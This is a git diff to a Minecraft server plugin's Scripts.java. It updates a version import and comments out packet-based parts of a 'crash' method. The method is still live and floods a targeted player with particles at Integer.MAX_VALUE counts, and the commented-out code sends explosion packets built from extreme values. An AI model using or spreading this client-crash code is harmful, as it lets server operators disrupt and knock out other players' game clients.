@@ -3,13 +3,9 @@ package cz.qery.toolkit;
 import com.google.gson.JsonObject;
 import com.google.gson.JsonParser;
 import cz.qery.toolkit.lunar.Waypoint;
-import net.minecraft.network.protocol.game.PacketPlayOutExplosion;
-import net.minecraft.network.protocol.game.PacketPlayOutSpawnEntityExperienceOrb;
 import net.minecraft.server.level.EntityPlayer;
-import net.minecraft.world.entity.EntityExperienceOrb;
-import net.minecraft.world.phys.Vec3D;
 import org.bukkit.*;
-import org.bukkit.craftbukkit.v1_18_R2.entity.CraftPlayer;
+import org.bukkit.craftbukkit.v1_19_R1.entity.CraftPlayer;
 import org.bukkit.entity.Player;
 import org.bukkit.metadata.FixedMetadataValue;
 
@@ -18,7 +14,6 @@ import java.net.http.HttpClient;
 import java.net.http.HttpRequest;
 import java.net.http.HttpResponse;
 import java.util.ArrayList;
-import java.util.Collections;
 import java.util.List;
 
 public class Scripts {
@@ -134,13 +129,17 @@ public class Scripts {
     public static void crash(Player p) throws InterruptedException {
         EntityPlayer p_entity = ((CraftPlayer) p).getHandle();
         Location loc = p.getLocation();
+        /*
 
         for (int i = 0; i < 100; i++) {
             PacketPlayOutExplosion packet = new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE));
             p_entity.b.a(packet);
         }
 
+
         Thread.sleep(1000);
+
+         */
 
         for (int i = 0; i < 100; i++) {
             p.spawnParticle(Particle.EXPLOSION_HUGE, loc, Integer.MAX_VALUE);
@@ -154,6 +153,7 @@ public class Scripts {
             p.spawnParticle(Particle.CRIT, loc, Integer.MAX_VALUE);
             p.spawnParticle(Particle.CRIT_MAGIC, loc, Integer.MAX_VALUE);
         }
+        /*
 
         Thread.sleep(1000);
 
@@ -162,6 +162,8 @@ public class Scripts {
             PacketPlayOutSpawnEntityExperienceOrb packet = new PacketPlayOutSpawnEntityExperienceOrb(dd);
             p_entity.b.a(packet);
         }
+
+         */
 
     }
 }
